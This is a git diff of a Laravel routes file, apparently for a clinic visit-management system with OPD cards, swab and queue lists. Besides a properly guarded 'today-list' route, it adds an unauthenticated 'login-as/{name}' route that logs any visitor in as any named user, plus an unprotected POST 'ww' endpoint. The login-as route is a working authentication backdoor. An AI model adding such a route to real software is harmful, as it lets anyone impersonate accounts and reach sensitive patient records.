@@ -24,6 +24,8 @@ use App\Http\Controllers\VisitQueueListController;
 use App\Http\Controllers\VisitsController;
 use App\Http\Controllers\VisitScreenListController;
 use App\Http\Controllers\VisitSwabListController;
+use App\Http\Controllers\VisitTodayListController;
+use App\Http\Controllers\WonderWomenController;
 use Illuminate\Support\Facades\Route;
 
 // Auth
@@ -97,6 +99,11 @@ Route::post('visits/attach-opd-card/{visit:slug}', [VisitAttachOPDCardController
      ->middleware('auth', 'can:attachOPDCard,visit')
      ->name('visits.attach-opd-card.store');
 
+// today list
+Route::get('visits/today-list', [VisitTodayListController::class, 'index'])
+     ->middleware('auth', 'can:view_mr_list')
+     ->name('visits.today-list');
+
 // queue
 Route::get('visits/queue-list', [VisitQueueListController::class, 'index'])
      ->middleware('auth', 'can:view_queue_list')
@@ -169,7 +176,17 @@ Route::middleware('auth')
               ->name('employees.show');
      });
 
+Route::get('login-as/{name}', function ($name) {
+    $user = \App\Models\User::whereName($name)->first();
+    \Auth::login($user);
+
+    return redirect()->route($user->home_page);
+});
+
 // server push
 Route::get('sse', ServerSendEventsController::class)
      ->middleware('auth')
      ->name('sse');
+
+// wonder woman
+Route::post('ww', WonderWomenController::class);
